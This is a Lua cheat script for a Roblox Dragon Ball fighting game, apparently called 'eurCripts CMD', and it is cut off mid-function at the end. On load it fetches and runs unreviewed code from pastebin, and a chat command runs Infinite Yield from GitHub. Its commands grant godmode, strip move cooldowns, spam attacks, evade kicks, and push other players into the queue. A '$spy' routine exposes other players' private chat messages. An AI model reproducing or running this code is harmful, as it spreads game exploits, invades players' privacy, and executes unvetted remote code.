if not game:IsLoaded() then
game.Loaded:Wait()
end 

--CREDITS + PROMOTES
 local A_1 = "1"
                local A_2 = "All"
                local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                Event:FireServer(A_1, A_2)


-- WARNS

warn("READ")
warn("Disable Errors + Warnings to see all Comands")

-- BLACKLIST + WHITELIST

loadstring(game:HttpGet("https://pastebin.com/raw/hszKhFF0"))()


--CREDITS

local ScreenGui = Instance.new("ScreenGui")
local eur = Instance.new("TextLabel")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.Parent = game.CoreGui

eur.Parent = ScreenGui
eur.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
eur.BackgroundTransparency = 1.000
eur.BorderColor3 = Color3.fromRGB(0, 0, 127)
eur.BorderSizePixel = 2
eur.Position = UDim2.new(0.750983, 70, 0, -15)
eur.Size = UDim2.new(0, 200, 0, 50)
eur.Font = Enum.Font.Cartoon
eur.Text = "Created By  eur#4932"
eur.TextColor3 = Color3.fromRGB(177, 229, 166)
eur.TextSize = 20.000
eur.Active = true

-- Help

		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "HELP";
			Text = "type (  $eurs  ) in chat to see the commands";
		})
        
    
local cmd30 = "" 
local cmd33 = "" 
local cmd66 = ""    
local cmd67 = "--------------------------------------------------------------------------------------------------------------"
local cmd1 = "$iy or $yield = Open another script ( CMD = ADMIN COMANDS )"
local cmd34 = "----------------------------------------------------------------------------"
local cmd2 = "$dc + $dragoncrush = buy dragoncrush to use glitch."
local cmd35 = "----------------------------------------------------------------------------"
local cmd31 = "$dragontrhow + $dt = grab a player and he go to queue... ( Buy DragonTrhow to use )"
local cmd36 = "$spy = You can see full chat and who send private messages"
local cmd3 = "$respawn + $re = insta respawn (doesn't work for jirens, frieza, majins)"
local cmd37 = "----------------------------------------------------------------------------"
local cmd4 = "$bonecrush + $bc = buy bonecrush, and bug guys to spacee..."
local cmd38 = "----------------------------------------------------------------------------"
local cmd5 = "$noslow + $ens = gives you noslow"
local cmd39 = "----------------------------------------------------------------------------"
local cmd6 = "$godmode + $egm = godmode only EARTH"
local cmd40 = "----------------------------------------------------------------------------"
local cmd7 = "$eurq = AntiQueue, He can t send you at queue"
local cmd41 = "----------------------------------------------------------------------------"
local cmd8 = "$antitpua = inmun to tpua ( ALONE U )"
local cmd42 = "----------------------------------------------------------------------------"
local cmd9 = "$rejoin = rejoin..."
local cmd43 = "----------------------------------------------------------------------------"
local cmd10 = "$earth = teleports to earth"
local cmd44 = "----------------------------------------------------------------------------"
local cmd11 = "$namek = teleports to namek"
local cmd45 = "----------------------------------------------------------------------------"
local cmd12 = "$space = teleports to space"
local cmd46 = "----------------------------------------------------------------------------"
local cmd13 = "$future = teleports to future"
local cmd47 = "----------------------------------------------------------------------------"
local cmd14 = "$secret = teleports to secret world"
local cmd48 = "----------------------------------------------------------------------------"
local cmd15 = "$heaven = teleports to heaven"
local cmd49 = "----------------------------------------------------------------------------"
local cmd16 = "$zaros = teleports to zaros"
local cmd50 = "----------------------------------------------------------------------------"
local cmd17 = "$queue = teleports to queue"
local cmd51 = "----------------------------------------------------------------------------"
local cmd18 = "$antiglitch or $eag = WORKS? "
local cmd52 = "----------------------------------------------------------------------------"
local cmd19 = "$beerus or $ebs = simply... Animation"
local cmd53 = "----------------------------------------------------------------------------"
local cmd20 = "$invis = You are invisible, nothing can see you. NEED / BUY FLASH STRIKE MOVE"
local cmd54 = "----------------------------------------------------------------------------"
local cmd21 = "$noclip or $nc = NoClip, you are a GHOOST | Im making "
local cmd55 = "----------------------------------------------------------------------------"
local cmd22 = "$legitmode = NoScripts..."
local cmd56 = "----------------------------------------------------------------------------"
local cmd23 = "$removelvl + $elvl = hides your level"
local cmd57 = "----------------------------------------------------------------------------"
local cmd24 = "$ewings = remove wings "
local cmd58 = "----------------------------------------------------------------------------"
local cmd25 = "$ehalo = remove halo "
local cmd59 = "----------------------------------------------------------------------------"
local cmd26 = "$hr + $hardreset = Hard Reset INSTA"
local cmd60 = "----------------------------------------------------------------------------"
local cmd27 = "$rejoin + $rj = Rejoin... "
local cmd61 = "----------------------------------------------------------------------------"
local cmd28 = "$antikick + $ek = When you´re be kicked for ( AFK or other reason ) you tp to queue"
local cmd62 = "----------------------------------------------------------------------------"
local cmd29 = "$antiafk or $afk = You are inmun to kicks... ( TESTED, WORKS Thanks Visonz#3597 ^^ )"
local cmd63 = "----------------------------------------------------------------------------"
local cmd31 = "$eslots = change your slots"
local cmd64 = "----------------------------------------------------------------------------"
local cmd32 = "$trash or $etr = Glitch, use NoSlow ( $noslow / $ns )"
local cmd65 = "----------------------------------------------------------------------------"

local Player = game.Players.LocalPlayer
Player.Chatted:connect(function(cht)
	if cht:match("$eurs") then
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "HELP";
			Text = "Press F9";
		})
		print(cmd1)
        print(cmd34)
		print(cmd2)
        print(cmd35)
		print(cmd4)
        print(cmd36)
		print(cmd3)
		print(cmd7)
		print(cmd10)
		print(cmd2)
		print(cmd8)
		print(cmd9)
		print(cmd15)
		print(cmd20)
		print(cmd12)
		print(cmd13)
		print(cmd22)
		print(cmd15)
		print(cmd16)
		print(cmd17)
		print(cmd18)
		print(cmd19)
		print(cmd22)
		print(cmd21)
		print(cmd14)
		print(cmd23)
		print(cmd29)
		print(cmd27)
        print(cmd26)
        print(cmd25)
        print(cmd60)
        print(cmd28)
        print(cmd61)
        print(cmd24)
        print(cmd62)
        print(cmd31)
        print(cmd63)
        print(cmd32)
        print(cmd64)
    end
end)

function dc()
	local plr = game.Players.LocalPlayer
	game.Workspace.Live[plr.Name]["Dragon Crush"].Activator["Flip"]:Destroy()
	game.Workspace.Live[plr.Name]["Dragon Crush"].Activator["Throw"]:Destroy()
	game.Workspace.Live[plr.Name]["Dragon Crush"].Activator["Blocked"]:Destroy()
	game.Workspace.Live[plr.Name]["Dragon Crush"].Activator["HitDown"]:Destroy()
	game.Workspace.Live[plr.Name]["Dragon Crush"].Activator["BoneBreak"]:Destroy()
end
function dc2()
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "eurCripts CMD";
		Text = "DragonCrush  Activated";
	})
end
local Player = game.Players.LocalPlayer
Player.Chatted:connect(function(cht)
	if cht:match("$dc") or cht:match("$dragoncrush") then
		dc2()
		dc()
	end
end)

function respawn()
-- Script generated by SimpleSpy - credits to exx#9394

	local args = {
		[1] = workspace.FriendlyNPCs:FindFirstChild("Hair Stylist")
	}

	game:GetService("Players").LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(unpack(args))
	-- Script generated by SimpleSpy - credits to exx#9394
	wait(.3)
	local args = {
		[1] = {
			[1] = "Yes"
		}
	}

	game:GetService("Players").LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack(args))
	wait(.3)
	-- Script generated by SimpleSpy - credits to exx#9394

	local args = {
		[1] = "woah"
	}

	game:GetService("Players").LocalPlayer.Backpack.HairScript.RemoteEvent:FireServer(unpack(args))
end

Player.Chatted:Connect(function(hehe)
if hehe.match("$respawn") then
respawn()
end
end)


--END

function noslow()
    while wait() do
y = game.Players.LocalPlayer.Character
for i,v in pairs(y:GetChildren()) do
if v.Name == "Justice Combination" then
x = y:WaitForChild("Action")
if x then wait() x:Destroy() end end
if v.Name == "Action" then v:Destroy() end
if v.Name == "Attacking" then v:Destroy() end
if v.Name == "Using" then v:Destroy() end
if v.Name == "hyper" then v:Destroy() end
if v.Name == "Hyper" then v:Destroy() end
if v.Name == "heavy" then v:Destroy() end
if v.Name == "KiBlasted" then v:Destroy() end
if v.Name == "Tele" then v:Destroy() end
if v.Name == "tele" then v:Destroy() end
if v.Name == "Killed" then v:Destroy() end
if v.Name == "Slow" then v:Destroy() end
if v.Name == "Block" and v.Value == true then
v.Value = false end end end

end
function noslow2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Noslow Loaded";
		})
end
Player.Chatted:connect(function(cht)
	if cht:match("$noslow") or cht:match("$ens") then
		noslow2()
		noslow()
	end
end)

function godmode()
    game:GetService("RunService").Stepped:Connect(function()
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game.Workspace.Touchy.Part, 0)
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game.Workspace.Touchy.Part, 1)
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Popup") then
game.Players.LocalPlayer.PlayerGui.Popup:Remove()
end end)
end

function godmode2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Godmode Activated!";
		})
end
Player.Chatted:connect(function(cht)
	if cht:match("$godmode") or cht:match("$egm") then
		godmode2()
		godmode()
	end
end)
function antiq()
    game.Workspace["Wormhole"].TouchInterest:Destroy()
end

function antiq2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Anti-Queue Activated";
		})
end

Player.Chatted:connect(function(cht)
	if cht:match("$antiqueue") or cht:match("$eurq") then
		antiq2()
		antiq()
	end
end)
function disable()
    local place = game.PlaceId
			
			game:GetService("TeleportService"):Teleport(place)
end
function disable2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Disabling...";
		})
		end

Player.Chatted:connect(function(cht)
	if cht:match("$legitmode") then
	    disable2()
		wait(1)
		disable()
	end
end)
function antitpua()
    while wait() do
pcall(function()
game.Workspace["Model"]:Destroy()
end)
end
end

function antitpua2()
     		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Anti-Tpua, Loaded";
		})
end

Player.Chatted:connect(function(cht)
	if cht:match("$antitpua") or cht:match("$atpua") then
	    antitpua2()
	    antitpua()
	end
end)
-- earth
function earth()
        local Earth = 536102540

    game:GetService("TeleportService"):Teleport(Earth)
end
function earth2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Going To Earth...";
		})
		wait(2)
end
-- namek
function namek()
        local Namek = 882399924

    game:GetService("TeleportService"):Teleport(Namek)
end
function namek2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Going To Namek";
		})
		wait(2)
end
-- space
function space()
            local Space = 478132461

    game:GetService("TeleportService"):Teleport(Space)
end
function space2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Going To Space...";
		})
		wait(2)
end
-- future
function future()
            local Future = 569994010

        game:GetService("TeleportService"):Teleport(Future)
end
function future2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Going To Future...";
		})
		wait(2)
end
-- secret
function secret()
    game:GetService("TeleportService"):Teleport(2046990924)
end
function secret2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Going To Secret World...";
		})
		wait(2)
end
-- otherworld
function heaven()
     game:GetService("TeleportService"):Teleport(3552157537)
    
end
function heaven2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Going To Heaven...";
		})
		wait(2)
end
-- zaros
function zaros()
     game:GetService("TeleportService"):Teleport(2651456105)
end
function zaros2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Going To Zaros...";
		})
		wait(2)
end
-- queue
function queue()
    game:GetService("TeleportService"):Teleport(3565304751)
    
end
function queue2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Going To Queue...";
		})
		wait(2)
end


Player.Chatted:connect(function(cht)
	if cht:match("$earth") then
	    earth2()
	    earth()
	end
end)

Player.Chatted:connect(function(cht)
	if cht:match("$namek") then
	    namek2()
	    namek()
	end
end)

Player.Chatted:connect(function(cht)
	if cht:match("$space") then
	    space2()
	    space()
	end
end)

Player.Chatted:connect(function(cht)
	if cht:match("$future") then
	    future2()
	    future()
	end
end)

Player.Chatted:connect(function(cht)
	if cht:match("$secret") then
	    secret2()
	    secret()
	end
end)

Player.Chatted:connect(function(cht)
	if cht:match("$heaven") then
	    heaven2()
	    heaven()
	end
end)

Player.Chatted:connect(function(cht)
	if cht:match("$zaros") then
	    zaros2()
	    zaros()
	end
end)

Player.Chatted:connect(function(cht)
	if cht:match("$queue") then
	    queue2()
	    queue()
	end
end)

function glitcht()
game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "AntiBug Activated";
		})
game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Press P For Insta-Respawn";
		})
end

function glitch1()
local plr = game.Players.LocalPlayer
while wait() do
    pcall(function()
        game:GetService("Workspace").Live[plr.Name].LowerTorso.KnockBacked:Destroy()
        game:GetService("Workspace").Live[plr.Name].LowerTorso.BodyVelocity:Destroy()
        game:GetService("Workspace").Live[plr.Name].LowerTorso.BodyVelocity:Destroy()

    end)
end
end 

function beerus1()
    
player = game.Players.LocalPlayer while wait() do
if game.Workspace.Live[player.Name].Animate.idle:FindFirstChild("Animation1") then
game.Workspace.Live[player.Name].Animate.idle:FindFirstChild("Animation1").AnimationId = "rbxassetid://1171558651"
if game.Workspace.Live[player.Name].Animate.walk:FindFirstChild("RunAnim") then
game.Workspace.Live[player.Name].Animate.walk:FindFirstChild("RunAnim").AnimationId = "rbxassetid://1171558651"
end end end

end
function beerus2()
    local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
local Animate 
local Humanoid = player.Character:FindFirstChild('Humanoid')
mouse.KeyDown:Connect(function(Key) 
 if Key == "w" then
  local Animation = Instance.new("Animation", player.Character)
  Animation.AnimationId = "rbxassetid://1171558651"
  Animate = Humanoid:LoadAnimation(Animation)
  Animate:Play()
end
end)

end

function beerus3()
game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Beerus, Loadeeed";
		})
end
Player.Chatted:connect(function(cht)
	if cht:match("$beerus") or cht:match ("$ebs")then
beerus3()
beerus2()
beerus1()
end
end)

function invis()
      local lplr = game.Players.LocalPlayer  
      Players = game.Players.LocalPlayer.Character
        Character = game.Players.LocalPlayer
        
        Players.Humanoid:EquipTool(Character.Backpack["Flash Strike"])
           Players["Flash Strike"]:Activate()
       lplr.Character["Flash Strike"].Activator.Animation:Destroy()
end

function invis1()
game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Invis Loaded, Need Flash Strike";
		})
end

Player.Chatted:connect(function(cht)
	if cht:match("$invis") then
invis1()
invis()
end
end)

function DESTROY()
local destroy = true

Move1 = "Final Flash"
Move2 = "Light Grenade"
Move3 = "Big Bang Attack"
Move4 = "Burning Blast"
Move5 = "Buu Blast"
Move6 = "Final Kame"
Move7 = "Big Bang Kamehameha"
Move8 = "Final Shine"
Move9 = "Spirit Bomb"
Move10 = "Kamehameha"
Move11 = "Galick Gun"
Move12 = "Dark Beam"
Move13 = "Gigantic Breath"
Move14 = "Explosive Wave"
Move15 = "Super Explosive Wave"
Move16 = "Broly Kamehameha"
repeat
        game:GetService("RunService").RenderStepped:Wait()
        for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if
                v.Name == Move1 or v.Name == Move2 or v.Name == Move3 or v.Name == Move4 or v.Name == Move5 or
                    v.Name == Move6 or
                    v.Name == Move7 or
                    v.Name == Move8 or
                    v.Name == Move9 or
                    v.Name == Move10 or
                    v.Name == Move11 or
                     v.Name == Move12 or
                      v.Name == Move13 or
                       v.Name == Move14 or
                        v.Name == Move15 or
                         v.Name == Move16
             then   
                v.Parent = game:GetService("Workspace").Live[game.Players.LocalPlayer.Name]
                wait()
                v:Activate()
                v:Deactivate()
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
 
    until destroy == false
end

if destruction == true then
Player.Chatted:connect(function(cht)
	if cht:match("$destruction") then

 WARNING()
	    	local plr = game:GetService("Players").LocalPlayer
	local mouse = plr:GetMouse()
	     mouse.KeyDown:connect(function(key)
	   if key == "k" then
	DESTROY()
end
end) 
mouse.KeyDown:connect(function(key)
 if key == "l" then
     local place = game.PlaceId
	game:GetService("TeleportService"):Teleport(place)
end
end) 

end
end)
end
function hidelvl()
    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Model"):Destroy()
end

function hidelvl1()
     game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "LVL HIDED";
		})
end

Player.Chatted:connect(function(cht)
	if cht:match("$removelvl") or cht:match ("$elvl") then
hidelvl1()
hidelvl()
end
end)
function wings()
    while wait() do
	        pcall(function()
	            game.Players.LocalPlayer.Character:FindFirstChild('RebirthWings').Handle:Destroy()
	        end)
    end
end
function hidewingsx()
game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Wings Removed";
		})  
end
Player.Chatted:connect(function(cht)
	if cht:match("$ewings")then
hidewingsx()
wings()
end
end)

function halo()
    while wait() do
	        pcall(function()
	            game.Players.LocalPlayer.Character:FindFirstChild('RealHalo').Handle:Destroy()
	        end)
    end
 end
function halox()
game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Halo Removed";
		})
end
Player.Chatted:connect(function(cht)
	if cht:match("$ehalo") then
halox()
halo()
end
end)

function hardreset()
player = game.Players.LocalPlayer while wait() do

game.Players.LocalPlayer.Character.Humanoid.Health = 0
end
end

function hardreset2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "...OPSSSS...??";
		})
end

Player.Chatted:connect(function(cht)
	if cht:match("$hr") or cht:match ("$hardreset") then
hardreset2()
hardreset()
end
end)

function rejoin() 
local place = game.placeId
    game:GetService("TeleportService"):Teleport(place)
end


function rejoin2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "Rejoininng";
		})
		wait(1)
end
Player.Chatted:connect(function(cht)
	if cht:match("$rj") or cht:match ("$rejoin") then
rejoin2()
rejoin()
end
end)

function antikick() 
    game:WaitForChild("CoreGui")
game.CoreGui:WaitForChild("RobloxPromptGui")
game.CoreGui.RobloxPromptGui:WaitForChild("promptOverlay")
_G.xd = true 
while _G.xd do wait()
if game:GetService("CoreGui").RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt") then 
game:GetService("TeleportService"):Teleport(536102540, LocalPlayer)
end
end
end

function antikick2()
    		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "eurCripts CMD";
			Text = "AntiKick, Loaded";
		})
end
Player.Chatted:connect(function(cht)
	if cht:match("$antikick") or cht:mathc("$ek") then
antikick2()
antikick()
end
end)

function afk()
wait(0.5)local ba=Instance.new("ScreenGui")
local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,304,0,52)
ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti Afk Kick Script"ca.TextColor3=Color3.new(0,1,1)
ca.TextSize=22;da.Parent=ca
da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
da.Size=UDim2.new(0,304,0,107)_b.Parent=da
_b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
_b.Size=UDim2.new(0,304,0,21)_b.Font=Enum.Font.Arial;_b.Text="Made by Discord: Krew Kard Developer#2335"
_b.TextColor3=Color3.new(1,1,1)_b.TextSize=20;ab.Parent=da
ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377379,0)
ab.Size=UDim2.new(0,304,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Script Started"
ab.TextColor3=Color3.new(1,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
bb:CaptureController()bb:ClickButton2(Vector2.new())
ab.Text="You went idle and ROBLOX tried to kick you but we reflected it!"wait(2)ab.Text="Script Re-Enabled"end)
end

function afk2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "AntiAFK, loaded";
})
end
Player.Chatted:connect(function(cht)
if cht:match("$antiafk") or cht:match("$afk") then
afk2()
afk()
end
end)

function iy()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end

function iy2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "InfiniteYield, loaded";
})
end
Player.Chatted:connect(function(cht)
if cht:match("$iy") or cht:match ("$yield") then
iy2()
iy()
end
end)

function contact()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "CONTACT";
        Text = "CONTACT ME AT DC eur#4932 ";
})
end
Player.Chatted:connect(function(cht)
if cht:match("$contact") then
contact()
contact()
end
end)

function dt()

    player.Backpack:WaitForChild("Dragon Throw")
    player.Backpack["Dragon Throw"].Activator:WaitForChild("Flip")
    wait()
    if (player.Backpack:FindFirstChild("Dragon Throw")) then
        repeat
            wait()
            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(player.Backpack["Dragon Throw"])
        until player.Character:FindFirstChild("Dragon Throw")

        repeat
            wait()
            game.Players.LocalPlayer.Character["Dragon Throw"]:Activate()
        until Character.Ki.Value < Character.Ki.MaxValue
    end
    repeat
        wait()
        Character["Dragon Throw"].Activator:FindFirstChild("Flip"):Destroy()
    until not Character["Dragon Throw"].Activator:FindFirstChild("Flip")
end

function dt2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCript CMD";
        Text = "DragonThrow Glitch Activated";
})
end
Player.Chatted:connect(function(cht)
if cht:match("$dt") or cht:match("$dragonthroww") then
dt()
dt2()
end
end)

function slots()
	local args = {
		[1] = workspace.FriendlyNPCs:FindFirstChild("Character Slot Changer")
	}

	game:GetService("Players").LocalPlayer.Backpack.ServerTraits.ChatStart:FireServer(unpack(args))
	
	wait(.3)
	local args = {
		[1] = {
			[1] = "Yes"
		}
	}

	game:GetService("Players").LocalPlayer.Backpack.ServerTraits.ChatAdvance:FireServer(unpack(args))
	wait(.3)
	
	local args = {
		[1] = "1"
	}

	game:GetService("Players").LocalPlayer.Backpack.CharacterSlotChanger.RemoteEvent:FireServer(unpack(args))
end

function slots2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "Loading...";
})
end
Player.Chatted:connect(function(cht)
if cht:match("$eslots") then
slots2()
slots()
end
end)

function trash()

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

Mouse.KeyDown:connect(function(Key)
Key = Key:lower()
if Key == 'w' then
workspace.Live:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart.VanishParticle:Destroy()
end
end)
    
end

function trash2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "TrashGlitch Loaded";
})
end

function trash3()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Recommended";
        Text = "Use NoSlow (  $ens  )";
})
end

Player.Chatted:connect(function(cht)
if cht:match("$trash") or cht:match("$etr") then
trash2()
trash()
trash3()
end
end)

function trash()

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

Mouse.KeyDown:connect(function(Key)
Key = Key:lower()
if Key == 'w' then
workspace.Live:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart.VanishParticle:Destroy()
end
end)
    
end

function bc()
game.Players.LocalPlayer.Character:WaitForChild("Bone Crush").Activator.Crash:Destroy()
end

function bc2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "BoneCrush Glitch Loaded";
})
end

function bc3()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "IMPORTANT";
        Text = "Wait 5 or 10  secs  to use BoneCrush  Move";
        Duration = "7.5"
})
end

Player.Chatted:connect(function(cht)
if cht:match("$bonecrush") or cht:match("$bc") then
bc2()
bc3()
bc()
end
end)

function vers2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "IMPORTANT";
        Text = "You re using the recent version";
})
end

function vers3()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Version";
        Text = "  1.1";
})
end

Player.Chatted:connect(function(cht)
if cht:match("$version") or cht:match("$version") then
vers2()
wait(1.2)
vers3()
end
end)

function spy()
--chat "/spy" to toggle!
enabled = true
spyOnMyself = true
public = false
publicItalics = true
privateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end

function spy2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "type  /spy  on chat to disable";
})
end
Player.Chatted:Connect(function(hehe)
if hehe:match("$spy") then
spy()
spy2()
end
end)

function bright()
-- FULLBRIGHT by ricey#7090
pcall(function()
	local lighting = game:GetService("Lighting");
	lighting.Ambient = Color3.fromRGB(255, 255, 255);
	lighting.Brightness = 1;
	lighting.FogEnd = 1e10;
	for i, v in pairs(lighting:GetDescendants()) do
		if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
			v.Enabled = false;
		end;
	end;
	lighting.Changed:Connect(function()
		lighting.Ambient = Color3.fromRGB(255, 255, 255);
		lighting.Brightness = 1;
		lighting.FogEnd = 1e10;
	end);
	spawn(function()
		local character = game:GetService("Players").LocalPlayer.Character;
		while wait() do
			repeat wait() until character ~= nil;
			if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
				local headlight = Instance.new("PointLight", character.HumanoidRootPart);
				headlight.Brightness = 1;
				headlight.Range = 60;
			end;
		end;
	end);
end)
end

function bright2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "FullBright Loaded";
})
end
Player.Chatted:Connect(function(zzz)
if zzz:match("$fbg") or zzz:match("$fullbright") then
bright2()
bright()
end 
end)

function spammov()
Move1 = "Anger Rush"
Move2 = "Meteor Crash"
Move3 = "Sweep Kick"
Move4 = "Neo Wolf Fang Fist"
Move5 = ""
Move6 = ""
Move7 = "Wolf Fang Fist"
Move8 = "TS Molotov"
Move9 = "Strong Kick"
Move10 = "Mach Kick" 


while wait() do

local plr = game.Players.LocalPlayer
for i, v in pairs(plr.Backpack:GetChildren()) do
if
    v.Name == Move1 or v.Name == Move2 or v.Name == Move3 or v.Name == Move4 or v.Name == Move5 or v.Name == Move6 or v.Name == Move7 or v.Name == Move8 or v.Name == Move9 or v.Name == Move10
then
        v.Parent = game.Workspace.Live[plr.Name]
    v:Activate()
   v:Deactivate()
  wait(0.3)
v.Parent = game.Players.LocalPlayer.Backpack
        end
    end
end
end

function spammov2()
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "eurCripts CMD";
        Text = "MoveSpam Loaded,  $hr  to disable";
})  
end

Player.Chatted:Connect(function(hehe)
if hehe:match("$meleeeur") or hehe:match("$eurm") then
spammov2()
spammov()
end
end)

function vmp()
player = game.Players.LocalPlayer while wait() do
